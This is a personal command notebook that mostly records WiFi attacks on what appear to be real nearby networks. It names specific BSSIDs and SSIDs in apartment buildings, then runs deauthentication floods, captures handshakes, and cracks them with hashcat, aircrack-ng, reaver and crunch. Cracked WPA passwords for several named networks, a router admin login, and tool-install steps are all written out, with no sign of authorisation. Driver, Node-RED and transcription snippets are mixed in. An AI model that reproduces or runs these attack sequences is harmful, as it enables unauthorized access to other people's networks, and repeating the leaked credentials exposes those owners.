# %%
#Connect Wifi through CLI
nmcli device wifi rescan
nmcli device wifi list
nmcli device wifi connect "TP-LINK_0E3B-5G" password 67831456

# %%
#OTHER WPA TOOLS
sudo apt-get install -y sslstrip bettercap asleap lighttpd hashcat john bully mdk4 beef-xss pixiewps openssl isc-dhcp-server dsniff hostapd hostapd-wpe iptables crunch mdk3 pyrit

sudo apt-get install -y \
sslstrip \
bettercap \
asleap \
lighttpd \
hashcat \
john \
bully \
mdk4 \
beef-xss \
pixiewps \
openssl \
isc-dhcp-server \
dsniff \
hostapd \
hostapd-wpe \
iptables \
crunch \
mdk3 \
pyrit
sudo apt-get install -y libpcap-dev libssl-dev
sudo apt-get install -y cowpatty

#packetforge-ng
#betterlog
#wpaclean
#aireplay-ng
#wash
#dhcp-server

# %%
#KALI_ROUTERSPLOIT
apt-get install python3-pip
git clone https://www.github.com/threat9/routersploit
cd routersploit
python3 -m pip install -r requirements.txt
python3 rsf.py
Bluetooth Low Energy support:

apt-get install libglib2.0-dev
python3 -m pip install bluepy
python3 rsf.py


https://www.youtube.com/watch?v=u0YrWfze9es
use scanners/autopwn
show options
set target 192.168.0.1
run

# %%
#KALI_CAPTIVEPORTAL

#SNIFFINGCAPTIVEPORTAL
 68:72:51:4C:3E:1B -55 100 27 7 3 10 130 OPN Level3B.Poplar20@Freedom

sudo systemctl stop NetworkManager
sudo airmon-ng check kill
sudo ip link set wlan0 down
sudo iw wlan0 set monitor control
sudo ip link set wlan0 up
sudo airodump-ng wlan0
#sudo airodump-ng wlan0 --channel 10 -w ~/Desktop/cap wlan0
sudo airodump-ng --bssid 68:72:51:4C:3E:1B --essid "Level3B.Poplar20@Freedom" --channel 10 -w ~/Desktop/CAP/cap wlan0
sudo airodump-ng --bssid 68:72:51:4C:3F:E2 --essid "Level3A.Poplar20@Freedom" --channel 4 -w ~/Desktop/CAP/cap wlan0
sudo airodump-ng --bssid 68:72:51:4C:3E:1B --essid "Level3C.Poplar20@Freedom" --channel 3 -w ~/Desktop/CAP/cap wlan0

# %%
#PWDCracking
#HASHCATDEP
sudo apt-get install -y ocl-icd-libopencl1 opencl-headers clinfo
#snap install scrcpy
#FORUBUNTU_KALISOURCESLIST
#https://www.fosslinux.com/6751/how-to-install-kali-linux-tools-using-katoolin-on-ubuntu-18-04-lts.htm
##wget -q -O - archive.kali.org/archive-key.asc | sudo apt-key add

# %%
#PWDGEN
#Install pyrit
sudo apt-get install -y pyrit
#install cap2hccapx
#http://stuffjasondoes.com/2018/07/18/converting-aircrack-ng-hashes-to-hccapx-format-and-cracking-with-hashcat/
cd ~
wget https://raw.githubusercontent.com/hashcat/hashcat-utils/master/src/cap2hccapx.c
#cd ~
#wget http://stuffjasondoes.com/tools/cap2hccapx.c
gcc -o cap2hccapx cap2hccapx.c
mv cap2hccapx /bin
rm cap2hccapx.c

# %%
#PWDGEN
#InstallCowpatty
#cd Desktop/
sudo apt-get install -y libpcap-dev libssl-dev
sudo apt-get install -y cowpatty
#wget http://www.willhackforsushi.com/code/cowpatty/4.6/cowpatty-4.6.tgz
#tar zxfv cowpatty-4.6.tgz
#cd cowpatty-4.6
#make
#sudo make install -d /usr/local/bin
#sudo rm -r ~/cowpatty-4.6

# %%
#INSTALLWIFIPHISHER1.2
sudo apt-get install python-pip -y
pip uninstall wifiphisher
pip install wifiphisher==1.2

# %%
#INSTALLWIFIPHISHER
cd ~
sapt-get install libnl-3-dev libnl-genl-3-dev
sudo apt-get install -y python-setuptools python3-setuptools
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python3 setup.py install

# %%
#INSTALLAIRGEDDON
cd ~
git clone --depth 1 https://github.com/v1s1t0r1sh3r3/airgeddon.git
cd airgeddon
sudo chmod +x airgeddon.sh
#sudo bash airgeddon.sh
cp ./airgeddon.sh /usr/bin/
sudo chmod +x /usr/bin/airgeddon.sh
airgeddon.sh

# %%
#INSTALLREAVERWPST6X
cd ~
git clone https://github.com/t6x/reaver-wps-fork-t6x
cd reaver-wps-fork-t6x/
cd src/
./configure
make
sudo make install

# %%
#INSTALLMDK3
sudo apt-get install -y mdk3

# %%
#INSTALLVMR-MDK2
git clone https://github.com/chunkingz/VMR-MDK-K2-2017R-012x4.git
cd VMR-MDK-K2-2017R-012x4
chmod +x VMR-MDK-K2-2017R-012x4.sh
mkdir VARMAC_CONFIG /root/
mkdir VARMAC_LOGS /root/
mkdir VARMAC_WASH /root/


#WARNING Before running manually remove any wifi virtual monitor ie #wlan0mon0 etc made by the newer airmon-ng
##./VMR-MDK-K2-2017R-012x4.sh
#cp ./VMR-MDK-K2-2017R-012x4.sh /usr/bin/
#chmod +x /usr/bin/VMR-MDK-K2-2017R-012x4.sh
#VMR-MDK-K2-2017R-012x4.sh

# %%
#InstallNvidia
#https://linuxconfig.org/how-to-install-the-nvidia-drivers-on-ubuntu-18-04-bionic-beaver-linux
#https://stackoverflow.com/questions/42984743/nvidia-smi-has-failed-because-it-couldnt-communicate-with-the-nvidia-driver
sudo apt-get install ubuntu-drivers-common -y
sudo ubuntu-drivers devices

lshw -numeric -C display
lspci -vnn | grep VGA
sudo dpkg --add-architecture i386
sudo apt update
sudo apt install build-essential libc6:i386 libglvnd-dev pkg-config -y
sudo apt-get install linux-headers-$(uname -r) linux-image-$(uname -r)

sudo bash -c "echo blacklist nouveau > /etc/modprobe.d/blacklist-nvidia-nouveau.conf"
sudo bash -c "echo options nouveau modeset=0 >> /etc/modprobe.d/blacklist-nvidia-nouveau.conf"
cat /etc/modprobe.d/blacklist-nvidia-nouveau.conf
sudo update-initramfs -u
sudo reboot

sudo telinit 3
#tty
sudo apt-get remove --purge nvidia* -y
sudo apt-get autoremove
sudo apt-get autoclean
sudo service gdm stop
sudo ~/Downloads/NVIDIA*
#sudo bash ~/Downloads/NVIDIA-Linux-x86_64-440.31.run -s
#sudo CC=gcc-7 ~/Downloads/NVIDIA-Linux-x86_64-440.31.run
sudo nvidia-xconfig
sudo cp /boot/grub/grub.cfg /boot/grub/grub.old
sudo sed -i 's|quiet splash|quiet splash nomodeset|g' /boot/grub/grub.cfg

sudo update-initramfs -u
sudo reboot

#https://askubuntu.com/questions/219942/how-to-uninstall-manually-installed-nvidia-drivers
sudo bash ~/Downloads/NVIDIA-Linux-x86_64-440.31.run --uninstall -s

# %%
#NodeRed
bash <(curl -sL https://raw.githubusercontent.com/node-red/linux-installers/master/deb/update-nodejs-and-nodered)
sudo systemctl enable nodered.service

# %%
Test

FORDFAN15
Newvember
NNN
Check groupon first

Lamy pico
Fennec
Moleskin
Games world
Milligram

# %%
KALISUCCESS

f65490f578d9bb50ee6f35283bb32fb9:c4715435f0a7:44d3adfca4c1:TP-LINK_F0A8:13472115
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Type........: WPA/WPA2
Hash.Target......: TP-LINK_F0A8 (AP:c4:71:54:35:f0:a7 STA:44:d3:ad:fc:a4:c1)
Time.Started.....: Sat Nov 23 00:07:30 2019 (2 hours, 32 mins)
Time.Estimated...: Sat Nov 23 02:39:35 2019 (0 secs)
Guess.Mask.......: ?1?1?1?1?1?1?1?1 [8]
Guess.Charset....: -1 ?H, -2 Undefined, -3 Undefined, -4 Undefined
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....: 183.4 kH/s (6.28ms)
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 1664000000/4294967296 (38.74%)
Rejected.........: 0/1664000000 (0.00%)
Restore.Point....: 103997440/268435456 (38.74%)
Candidates.#1....: 1234BCC0 -> 1F6E0702
HWMon.Dev.#1.....: Temp: 69c Fan: 42% Util: 96% Core:1923MHz Mem:3802MHz Bus:16

TP-LINK_F0A8 13472115
TP-LINK_0E3B 67831456
OCCOM_777C 56096903

KALI_INFO_BF2

https://gpuhash.me/
https://www.onlinehashcrack.com/
https://hashcat.net/wiki/doku.php?id=hashcat
https://medium.com/@brannondorsey/crack-wpa-wpa2-wi-fi-routers-with-aircrack-ng-and-hashcat-a5a5d3ffea46
https://laconicwolf.com/2018/09/29/hashcat-tutorial-the-basics-of-cracking-passwords-with-hashcat/
https://miloserdov.org/?p=953
https://resources.infosecinstitute.com/hashcat-tutorial-beginners/#gref

https://westoahu.hawaii.edu/cyber/how-to-install-kali-linux-as-an-app-in-windows-10/

https://www.se7ensins.com/forums/threads/how-to-setup-a-gaming-virtual-machine-with-gpu-passthrough-qemu-kvm-libvirt-and-vfio.1371980/
https://superuser.com/questions/779070/use-nvidia-gpu-from-virtualbox
                                                                                                                 
                                                                                                                       
                                                                                     

sudo service networking restart
sudo service NetworkManager restart
#sudo airodump-ng wlxd0374534a264

sudo ifconfig wlxd0374534a264 down
sudo iw dev wlxd0374534a264 set type monitor
sudo ifconfig wlxd0374534a264 up

sudo ifconfig wlx1cbfce35c3c1 down
sudo iw dev wlx1cbfce35c3c1 set type monitor
sudo ifconfig wlx1cbfce35c3c1 up



#USINGBULLY
sudo bully wlxd0374534a264 -b A4:91:B1:BA:E1:F9 -e TelstraBAE1F9 -c 11
sudo bully wlxd0374534a264 -b CE:2D:E0:00:2D:16 -e 404@17Poplar-2G -c 4
sudo reaver -i wlxd0374534a264 -b C4:71:54:1E:1C:F3 -vv -c 1 -d 5 -w
CE:2D:E0:11:73:7C
reaver -i wlxd0374534a264 -b CE:2D:E0:11:73:7C -vv -c 3 -d 5 -w


#TLWN722N wlxd0374534a264
#RTL8812bu wlx1cbfce35c3c1
sudo airodump-ng wlxd0374534a264

sudo wash -i wlxd0374534a264
sudo wash -i wlx1cbfce35c3c1
sudo airodump-ng wlx1cbfce35c3c1
sudo service networking restart
sudo service NetworkManager restart
sudo ifconfig wlxd0374534a264 down
sudo iw dev wlxd0374534a264 set type monitor
sudo ifconfig wlxd0374534a264 up
sudo killall wpa_supplicant
sudo airodump-ng wlxd0374534a264
sudo airodump-ng --bssid CE:2D:E0:11:73:7C -c 3 --write ~/Desktop/31119 wlxd0374534a264
sudo aireplay-ng --deauth 100 -a CE:2D:E0:11:73:7C wlxd0374534a264
pyrit -r ~/Desktop/31019-11.cap analyze
aircrack-ng ~/Desktop/31019-11.cap -w ~/Desktop/pl3

crunch 8 8 1234567890ABCDEF | aircrack-ng ~/Desktop/31019-11.cap -w
-w /media/user/SED/pl7

cd Desktop
#aircrack-ng 31019-11.cap -J output
cap2hccapx ~/Desktop/CAP/31019-11.cap ~/Desktop/CAP/output.hccapx
hashcat -m 2500 ~/Desktop/CAP/output.hccapx -a 3 ?d?d?d?d?d?d?d?d

cowpatty -c -r ~/Desktop/31019-01.cap
#crunch 8 8 abcdefghijklmnopqrstuvwxyz1234567890 < ~/Desktop/pl5
#crunch 8 8 abcdefghijklmnopqrstuvwxyz1234567890 | pyrit -r ~/Desktop/31019-11.cap analyze
#python3 wgen.py --chars=1234567890ABCDEF --min_length=8 --max_length=8 --output=/media/user/SED/pl7
#python3 wgen.py --chars=1234567890 --min_length=8 --max_length=8 --output=/media/user/SED/pl9
#python3 wgen.py --chars=1234567890abcdefghijklmnopqrstuvwxyz --min_length=8 --max_length=8 --output=/media/user/SED/pl11


GPUHASH.me
ONLINEHASHCRACKING.com
Fid9688eyE
dvTVa4chZ7


504741726
50:D4:F7:41:A7:26 -74 27 36 0 6 54e WPA2 CCMP PSK WiFi-A726
sudo airodump-ng --bssid 50:D4:F7:41:A7:26 -c 6 --write ~/Desktop/WIFIA726 wlxd0374534a264
sudo aireplay-ng --deauth 100 -a 50:D4:F7:41:A7:26 wlxd0374534a264
pyrit -r ~/Desktop/WIFIA726.cap analyze
aircrack-ng ~/Desktop/31019-11.cap -w ~/Desktop/pl3

sudo airodump-ng --bssid BC:30:D9:B1:74:73 -c 2 --write ~/Desktop/TelstraB17471 wlxd0374534a264
sudo aireplay-ng --deauth 100 -a BC:30:D9:B1:74:73 wlxd0374534a264
pyrit -r ~/Desktop/TelstraB17471-09.cap analyze
aircrack-ng ~/Desktop/31019-11.cap -w ~/Desktop/pl3

A4:91:B1:E4:E0:63 -78 1 1 0 11 54e WPA2 CCMP PSK TelstraE4E063
sudo airodump-ng --bssid A4:91:B1:E4:E0:63 -c 11 --write ~/Desktop/TelstraB17471 wlxd0374534a264
sudo aireplay-ng --deauth 100 -a A4:91:B1:E4:E0:63 wlxd0374534a264
pyrit -r ~/Desktop/TelstraE4E063-01.cap analyze
aircrack-ng ~/Desktop/31019-11.cap -w ~/Desktop/pl3

66:D1:54:35:1F:FA -78 1 4 0 8 54e. WPA2 CCMP PSK 610@19Poplar-2G
#1: AccessPoint 66:d1:54:35:1f:fa ('610@19Poplar-2G'):
  #1: Station d8:13:99:a5:ed:28
  #2: Station e0:e6:2e:e0:b2:17
sudo airodump-ng --bssid 66:D1:54:35:1F:FA -c 8 --write ~/Desktop/610@19Poplar-2G wlxd0374534a264
sudo aireplay-ng --deauth 100 -a 66:D1:54:35:1F:FA wlxd0374534a264
pyrit -r ~/Desktop/610@19Poplar-2G -01.cap analyze
aircrack-ng ~/Desktop/31019-11.cap -w ~/Desktop/pl3

66:D1:54:F5:67:92 -78 0 2 0 6 54e. WPA2 CCMP PSK 405@17Poplar-2G
sudo airodump-ng --bssid 66:D1:54:F5:67:92 -c 6 --write ~/Desktop/405@17Poplar-2G wlxd0374534a264
sudo aireplay-ng --deauth 100 -a 66:D1:54:F5:67:92 wlxd0374534a264
pyrit -r ~/Desktop/TelstraE4E063-01.cap analyze
aircrack-ng ~/Desktop/31019-11.cap -w ~/Desktop/pl3


#TP-LINK_0E3B
34:E8:94:0E:0E:3A -65 224 4 0 11 130 WPA2 CCMP PSK TP-LINK_0E3B
Selected handshake:

  ESSID.......: TP-LINK_0E3B
  BSSID.......: 34:E8:94:0E:0E:3A (Tp-Link Technologies Co.,Ltd.)
  STMAC.......: 1C:36:BB:2A:5D:CC (Apple, Inc.)
  MIC.........: EA50A56AD52BE250B1D1D98AC569D023
  MIC.........: CF61C8A8183F2675C5765C3B944BAA5D
  Handshakes..: 3 (2 authenticated)

Congratulations, your task was successfully sent to our server!

Your task id is dvTVa4chZ7

Please write down your task id since you will need it later to get access to your task!
If you selected any paid options your task will be queued as soon as we receive at least one confirmation of payment from Bitcoin network

sudo service NetworkManager restart && sudo airmon-ng check kill && sudo killall wpa_supplicant && sleep 3 && sudo airodump-ng wlan0
sudo airodump-ng --bssid 34:E8:94:0E:0E:3A -c 4 --write ~/Desktop/CAP/TP-LINK_0E3B wlan0
sudo aireplay-ng --deauth 100 -a 34:E8:94:0E:0E:3A wlan0

pyrit -r ~/Desktop/CAP/TP-LINK_0E3B-11.cap analyze
cap2hccapx ~/Desktop/CAP/TP-LINK_0E3B-11.cap ~/Desktop/CAP/TP-LINK_0E3B.hccapx
GPUHASH.me
hashcat -m 2500 ~/Desktop/CAP/TP-LINK_0E3B-05.hccapx -o cracked.txt -a 3 -1 ?H ?1?1?1?1?1?1?1?1


 
#SuperBigHeadAlpaca
BC:30:D9:BA:61:28 -70 25 10 0 1 195 WPA2 CCMP PSK SuperBigHeadAlpaca
sudo service NetworkManager restart && sudo airmon-ng check kill && sudo killall wpa_supplicant && sleep 3 && sudo airodump-ng wlan0
sudo airodump-ng --bssid BC:30:D9:BA:61:28 --write ~/Desktop/CAP/SuperBigHeadAlpaca wlan0 -c 1
sudo aireplay-ng -a BC:30:D9:BA:61:28 wlan0 --deauth 100

pyrit -r ~/Desktop/CAP/TP-LINK_0E3B-11.cap analyze
cap2hccapx ~/Desktop/CAP/TP-LINK_0E3B-11.cap ~/Desktop/CAP/TP-LINK_0E3B.hccapx
GPUHASH.me
hashcat -m 2500 ~/Desktop/CAP/TP-LINK_0E3B-05.hccapx -o cracked.txt -a 3 -1 ?H ?1?1?1?1?1?1?1?1

#311@19Poplar-2G
CE:2D:E0:11:73:7C -61 76 14 0 3 130 WPA2 CCMP PSK 311@19Poplar-2G
sudo service NetworkManager restart && sudo airmon-ng check kill && sudo killall wpa_supplicant && sleep 3 && sudo airodump-ng wlan0
sudo airodump-ng --bssid CE:2D:E0:11:73:7C -c 3 --write ~/Desktop/CAP/311@19Poplar-2G wlan0
sudo aireplay-ng --deauth 100 -a CE:2D:E0:11:73:7C wlan0

pyrit -r ~/Desktop/CAP/TP-LINK_0E3B-11.cap analyze
cap2hccapx ~/Desktop/CAP/TP-LINK_0E3B-11.cap ~/Desktop/CAP/TP-LINK_0E3B.hccapx
GPUHASH.me
hashcat -m 2500 ~/Desktop/CAP/TP-LINK_0E3B-05.hccapx -o cracked.txt -a 3 -1 ?H ?1?1?1?1?1?1?1?1


CE:2D:E0:11:76:62 -66 47 7 0 11 130 WPA2 CCMP PSK 407@19Poplar-2G
sudo service NetworkManager restart && sudo airmon-ng check kill && sudo killall wpa_supplicant && sleep 3 && sudo airodump-ng wlan0
sudo airodump-ng --bssid CE:2D:E0:11:76:62 -c 11 --write ~/Desktop/CAP/407@19Poplar-2G wlan0
sudo aireplay-ng --deauth 100 -a CE:2D:E0:11:76:62 wlan0

pyrit -r ~/Desktop/CAP/TP-LINK_0E3B-11.cap analyze
cap2hccapx ~/Desktop/CAP/TP-LINK_0E3B-11.cap ~/Desktop/CAP/TP-LINK_0E3B.hccapx
GPUHASH.me
hashcat -m 2500 ~/Desktop/CAP/TP-LINK_0E3B-05.hccapx -o cracked.txt -a 3 -1 ?H ?1?1?1?1?1?1?1?1

66:D1:54:90:6A:B3 -70 42 12 1 11 130 WPA2 CCMP PSK 609@19Poplar-2G
 CE:2D:E0:11:76:62 -66 26 2 0 11 130 WPA2 CCMP PSK 407@19Poplar-2G
sudo service NetworkManager restart && sudo airmon-ng check kill && sudo killall wpa_supplicant && sleep 3 && sudo airodump-ng wlan0
sudo mkdir ~/Desktop/CAP
sudo airodump-ng --bssid CE:2D:E0:11:76:62 --write ~/Desktop/CAP/TelstraBAE1F9 wlan0 -c 11
sudo aireplay-ng -a CE:2D:E0:11:76:62 wlan0 --deauth 50
                                                                                                                                     
 E6:8D:8C:B2:93:23 -69 20 1 0 11 130 WPA2 CCMP PSK 409@19Poplar-2G
 66:D1:54:F5:67:92 -73 19 1 0 6 130 WPA2 CCMP PSK 405@17Poplar-2G
A4:91:B1:E4:E0:63 -72 12 4 0 11 195 WPA2 CCMP PSK TelstraE4E063
 66:D1:54:F5:67:92 -70 6 1 0 6 130 WPA2 CCMP PSK 405@17Poplar-2G
66:D1:54:F5:6A:55 -72 23 1 0 11 130 WPA2 CCMP PSK 112@19Poplar-2G
 CE:2D:E0:11:76:70 -76 11 1 0 5 130 WPA2 CCMP PSK 310@19Poplar-2G
 34:6B:46:BF:B0:27 -75 16 1 0 11 130 WPA2 CCMP PSK OPTUS_BFB025
 A4:91:B1:C5:B7:FD -79 7 1 0 11 195 WPA2 CCMP PSK TelstraC5B7FD

 50:D4:F7:0D:0B:20 -70 27 1 0 4 130 WPA2 CCMP PSK WiFi-0B20
sudo service NetworkManager restart && sudo airmon-ng check kill && sudo killall wpa_supplicant && sleep 3 && sudo airodump-ng wlan0
sudo mkdir ~/Desktop/CAP
sudo airodump-ng --bssid 50:D4:F7:0D:0B:20 --write ~/Desktop/CAP/WiFi-0B20 wlan0 -c 4
sudo aireplay-ng -a 50:D4:F7:0D:0B:20 wlan0 --deauth 50
                                                                                                                                        
A4:91:B1:BA:E1:F9 -68 43 3 0 6 195 WPA2 CCMP PSK TelstraBAE1F9
#TP-LINK_6CA3
#34:E8:94:41:6C:A2 -75 16 2 0 1 130 WPA2 CCMP PSK TP-LINK_6CA3
#TelstraB17471
BC:30:D9:B1:74:73 -72 12 1 0 2 195 WPA2 CCMP PSK TelstraB17471
#TP-LINK_1CF4
C4:71:54:1E:1C:F3 -70 12 1 0 1 65 WPA2 CCMP PSK TP-LINK_1CF4
#TP-LINK_F0A8
#handshakefromSP3
C4:71:54:35:F0:A7 -67 6 3 0 6 130 WPA2 CCMP PSK TP-LINK_F0A8

#TP-LINK_8013
34:E8:94:6E:80:12 -74 9 1 0 6 130 WPA2 CCMP PSK TP-LINK_8013

# %%
#REAVERPIXIE
#https://null-byte.wonderhowto.com/how-to/hack-wifi-using-wps-pixie-dust-attack-0162671/
sudo apt-get install -y \
build-essential \
libpcap-dev \
sqlite3 \
libsqlite3-dev \
#pixiewps \
#mdk3

# %%
#Wireless adapter
Atheros AR9271
Ralink RT3070
Ralink RT3572
Realtek 8187L (Wireless G adapters)
Realtek RTL8812AU (newly in 2017)
my research also suggests the 
Ralink RT5370Nis compatible

# %%
#LINUX_WIFIADAPTERS

airmon-ng check kill
#You may also uncheck the box "Automatically connect to this network when it is avaiable" in nm-connection-editor. This only works if you have a saved wifi connection.
#Set interface down
sudo ip link set wlan0 down
#Set monitor mode
sudo iw dev wlan0 set type monitor
#Set interface up
sudo ip link set wlan0 up
#For setting TX power
sudo iw wlan0 set txpower fixed 3000





#Run following commands for disable power management and plugging/replugging issues.
sudo mkdir -p /etc/modprobe.d/
sudo touch /etc/modprobe.d/rtl8188fu.conf
echo "options rtl8188fu rtw_power_mgnt=0 rtw_enusbss=0" | sudo tee /etc/modprobe.d/rtl8188fu.confsudo mkdir -p /etc/modprobe.d/
sudo touch /etc/modprobe.d/rtl8188fu.conf
echo "options rtl8188fu rtw_power_mgnt=0 rtw_enusbss=0" | sudo tee /etc/modprobe.d/rtl8188fu.conf
#How to uninstall
#sudo dkms remove rtl8188fu/1.0 --all
#sudo rm -f /lib/firmware/rtlwifi/rtl8188fufw.bin
#sudo rm -f /etc/modprobe.d/rtl8188fu.conf

#How to install from PPA repository
#You can install rtl81188fu driver with following commands from PPA.
#xUbuntu 16.04-19.10 / Linux Mint 18.x-19.x
#sudo add-apt-repository ppa:kelebek333/kablosuz
#sudo apt-get update
#sudo apt install rtl8188fu-dkms
#You can purge packages with following commands
#sudo apt purge rtl8188fu-dkms



#ubuntu
#rtl8188ftv
sudo airodump-ng wlx00e0262e083b
#rtl8812bu
sudo airodump-ng wlx1cbfce35c3c1
#rtl8188eus
sudo airodump-ng wlxd0374534a264
sudo modprobe -r 88x2bu
#kali
sudo rmmod r8188eu && sudo insmod 8188eu.ko
sudo iw wlan0 set type monitor
sudo airodump-ng wlan0

#https://www.linuxbabe.com/command-line/ubuntu-server-16-04-wifi-wpa-supplicant


https://www.youtube.com/watch?v=n49kukPf8HI
sudo sed -i '|wifi.powersave = 3|wifi.powersave = 2|' /etc/NetworkManager/conf.d/default-wifi-powersave-on.conf

#reaver1.4
#https://askubuntu.com/questions/861953/installing-reaver-1-4/861958
sudo apt-get remove reaver -y
sudo -s
#https://askubuntu.com/questions/568859/error-pcap-library-not-found
sudo apt-get install libsqlite3-0 libpcap0.8 -y
sudo apt-get install libpcap-dev sqlite3 libsqlite3-dev libpcap0.8-dev -y
wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/reaver-wps/reaver-1.4.tar.gz
tar -xzvf reaver-1.4.tar.gz
cd reaver-1.4
cd src
./configure
make
sudo make install
#sudo make distclean

#reaverlatest
wget https://github.com/t6x/reaver-wps-fork-t6x/archive/master.zip && unzip master.zip
cd reaver-wps-fork-t6x*
cd src
./configure
make
sudo make install


iw dev wlan0 set type monitor
reaver -i wlan0 -b 66:D1:54:35:20:0F -vv
reaver -i wlan0 -b 6C:B0:CE:69:EA:2E -vv




TP-Link
8 char
mac address
#TP-LINK_8013
34:E8:94:6E:80:12
946E8012

#TP-LINK_0E3B
34:E8:94:0E:0E:3A
940E0E3A

https://www.lifewire.com/netgear-default-password-list-2619154
NetGear DEVG2020
10 digit number
#Telstra20B2
6C:B0:CE:69:EA:2E
7490946198
http://192.168.15.1
admin
telstra

sudo airodump-ng wlxd0374534a264 -bbsid "Telstra20B2"
sudo reaver -i wlxd0374534a264 -b 6C:B0:CE:69:EA:2E -vv
python D:\python-wordlist-generator-master\wgen.py -chr=abcdefghijklmnopqrstuvwxyz01234567890 -min=8 -max=8 -out=wordlist.txt
python D:\python-wordlist-generator-master\wgen.py -chr=abcdefghijklmnopqrstuvwxyz01234567890 -min=8 -max=8 -out=D:\python-wordlist-generator-master\wordlist.txt

Freedom
#301@20Poplar-2G
66:D1:54:35:20:0F
asd67890
small char 5 digit
MikroTik hAP series

# %%
#WLAN_NEW
66:D1:54:6D:A0:CC -73 23 0 0 11 130 WPA2 CCMP PSK 301@19Poplar-2G
66:D1:54:35:20:0F -22 38 0 0 11 54e. WPA2 CCMP PSK 301@Poplar20-2G
64:D1:54:35:20:0F -28 32 0 0 11 54e. OPN 301-Poplar20-2G@Freedom
66:D1:54:F5:6A:86 -71 5 0 0 6 54e. WPA2 CCMP PSK G09@19Poplar-2G
66:D1:54:33:C1:86 -71 6 0 0 3 54e. WPA2 CCMP PSK 111@19Poplar-2G
66:D1:54:B3:05:39 -70 8 0 0 3 54e. WPA2 CCMP PSK 209@19Poplar-2G
CE:2D:E0:00:2D:16 -70 6 0 0 4 54e. WPA2 CCMP PSK 404@17Poplar-2G
CE:2D:E0:11:7A:A6 -71 3 0 0 3 54e. WPA2 CCMP PSK 410@19Poplar-2G

66-D1-54-F5-6A-86 -71 5 0 0 6 54e. WPA2 CCMP PSK G09@19Poplar-2G
66-D1-54-33-C1-86 -71 6 0 0 3 54e. WPA2 CCMP PSK 111@19Poplar-2G
CE-2D-E0-00-2D-16 -70 6 0 0 4 54e. WPA2 CCMP PSK 404@17Poplar-2G
CE-2D-E0-11-7A-A6 -71 5 0 0 3 54e. WPA2 CCMP PSK 410@19Poplar-2G



  
68:72:51:4C:3F:E2 -46 9 3 0 4 54e. OPN Level3A.Poplar20@Freedom
68:72:51:4C:3E:1B -57 7 3 0 10 54e. OPN Level3B.Poplar20@Freedom
64:D1:54:33:C1:86 -69 13 0 0 3 54e. OPN FreedomShared@19Poplar
64:D1:54:B3:05:39 -70 7 0 0 3 54e. OPN FreedomShared@19Poplar
CC:2D:E0:00:2D:16 -70 2 0 0 4 54e. OPN FreedomShared@17Poplar
CC:2D:E0:11:7A:A6 -72 2 0 0 3 54e. OPN FreedomShared@19Poplar


98:DA:C4:23:77:7C -71 3 0 0 9 54e WPA2 CCMP PSK OCCOM_777C
50:D4:F7:41:A7:26 -69 3 0 0 4 54e WPA2 CCMP PSK WiFi-A726
34:E8:94:0E:0E:3A -69 6 0 0 11 54e. WPA2 CCMP PSK TP-LINK_0E3B
34:E8:94:6E:80:12 -70 7 0 0 11 54e. WPA2 CCMP PSK TP-LINK_8013
70:4F:57:1F:74:0F -68 10 0 0 3 54e WPA2 CCMP PSK maison noire - 2.4G
A4:91:B1:29:5E:49 -72 4 0 0 1 54e WPA2 CCMP PSK Vodafone2.4G-95E48

34:E8:94:41:6C:A1 -80 2 0 0 40 780 WPA2 CCMP PSK TP-LINK_6CA3_5G
34:E8:94:41:6C:A2 -76 2 0 0 1 130 WPA2 CCMP PSK TP-LINK_6CA3
 EC:BE:DD:57:87:10 -73 3 0 0 11 195 WPA2 CCMP PSK Optus_57870E
50:D4:F7:41:A7:28 -81 1 1 0 149 1170 WPA2 CCMP PSK WiFi-A726-5G
50:D4:F7:41:A7:27

34:E8:94:6E:80:11 -85 3 0 0 36 780 WPA2 CCMP PSK TP-LINK_8013_5G
34:E8:94:6E:80:12 -70 1 0 0 1 130 WPA2 CCMP PSK TP-LINK_8013

50:D4:F7:0D:0B:22 -64 6 0 0 149 1170 WPA2 CCMP PSK WiFi-0B20-5G
50:D4:F7:0D:0B:20 -71 1 0 0 4 130 WPA2 CCMP PSK WiFi-0B20
A0:63:91:CA:BD:C8 -72 6 0 0 153 780 WPA2 CCMP PSK NETGEAR38-5G
70:4F:57:1F:74:0F -63 11 0 0 10 270 WPA2 CCMP PSK maison noire - 2.4G
C4:71:54:2E:1F:F6 -80 3 0 0 36 780 WPA2 CCMP PSK LB-Home_5G
70:4F:57:1F:74:0E -63 7 0 0 153 390 WPA2 CCMP PSK maison noire - 5G

A4:91:B1:E4:E0:63 -71 16 0 0 13 195 WPA2 CCMP PSK TelstraE4E063
 A6:91:B1:E4:E0:6B -67 6 0 0 104 1733 WPA2 CCMP PSK TelstraE4E063
 A6:91:B1:BA:E1:01 -73 9 0 0 104 1733 WPA2 CCMP PSK TelstraBAE1F9
 A6:91:B1:29:5E:51 -80 5 0 0 100 1170 WPA2 CCMP PSK Vodafone5G-95E48

# %%
#LINUX_TRANSCRIBE
#https://askubuntu.com/questions/161515/speech-recognition-app-to-convert-mp3-to-text
ffmpeg -i $(youtube-dl -f 22 --get-url https://www.youtube.com/watch?v=oflN6WZOzxw) \
-ss 00:00:10 -t 00:00:30 -c:v copy -c:a copy \
happy.mp4

cd "C:\Users\user\Documents\VBoxShared"
youtube-dl -o '%(title)s by %(uploader)s on %(upload_date)s in %(playlist)s.%(ext)s' https://www.youtube.com/watch?v=7E-cwdnsiow
youtube-dl --get-duration "https://www.youtube.com/watch?v=oflN6WZOzxw"
youtube-dl -x --audio-format mp3 "https://www.youtube.com/watch?v=oflN6WZOzxw" --output "C:\Users\user\Documents\VBoxShared\file.mp3"
ffmpeg -ss 0 -t 30 -i file.mp3 -ar 16000 -ac 1 file.flac
google-chrome "https://cloud.google.com/speech-to-text/"
Send, {Tab 8}



youtube-dl --get-format --get-url "https://www.youtube.com/watch?v=oflN6WZOzxw"
youtube-dl -x --audio-format mp3 --get-url "https://www.youtube.com/watch?v=oflN6WZOzxw" --output "C:\Users\user\Documents\VBoxShared\file.mp3"
ffmpeg -ss 0 -t 30 -i file.mp3 -ar 16000 -ac 1 file.flac

youtube-dl -x --audio-format mp3 --get-url "https://www.youtube.com/watch?v=MOggwSls7xQ" --output "C:\Users\user\Documents\VBoxShared\file.mp3"

git clone https://github.com/sararob/ml-talk-demos.git
cd speech/
brew install sox --with-flac
bash request.sh

